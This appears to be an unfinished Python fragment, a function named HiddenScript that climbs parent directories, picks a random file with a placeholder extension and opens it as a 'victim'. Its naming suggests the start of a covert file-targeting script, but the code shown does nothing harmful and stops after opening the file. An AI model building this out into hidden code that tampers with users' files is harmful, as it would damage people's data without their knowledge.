import os
from random import choice, randint
from Tree import Tree

def HiddenScript(self):
    filepath = os.getcwd() #note to self: this is how you get a file's location (most of the time, at least)
    while True:
        t = Tree(os.path.dirname(filepath))
        try:
            victim = open(os.path.dirname(filepath) + "\\" + choice(t.searchExtension(".insertYoursHere")), mode='r')
            break
        except IndexError:
            filepath = os.path.dirname(filepath)